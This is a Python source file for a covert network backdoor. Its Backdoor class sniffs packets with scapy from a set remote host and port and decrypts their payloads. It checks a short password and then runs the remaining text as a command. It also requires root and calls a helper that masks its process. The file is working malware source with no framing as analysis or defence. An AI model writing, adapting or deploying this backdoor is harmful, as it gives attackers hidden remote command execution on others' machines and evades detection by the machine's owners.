import socket, os, sys, time, logging
from scapy.all import *
import encryption
import netifaces
import helpers
from cmdExec import CommandExecutor

class Backdoor(object):

    def __init__(self, lhost, lport, rhost, rport, proto, password):
        self.state = 0
        self.localIP = lhost
        self.localPort = int(lport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()

        self.password = password
        self.cmdExecutor = CommandExecutor()

    def run(self):
        helpers.checkRootPrivilege()
        helpers.maskProcess()
        self.listen()

    def listen(self):
        mFilter = self.protocol.lower() + " and src host " + self.remoteIP + " and dst port " + str(self.localPort) + \
                " and src port " + str(self.remotePort)
        sniff(lfilter=self.is_incoming, filter=mFilter, prn=self.parsePacket)

    def parsePacket(self, packet):
        payload = packet[self.protocol].payload.load
        payload = encryption.decrypt(payload)

        if payload == "":
            return

        pwd = payload[:8]
        cmd = payload[8:]

        if pwd not in self.password:
            print("Incorrect password")
            return
        else:
            self.cmdExecutor.execute(cmd)

    def is_incoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr
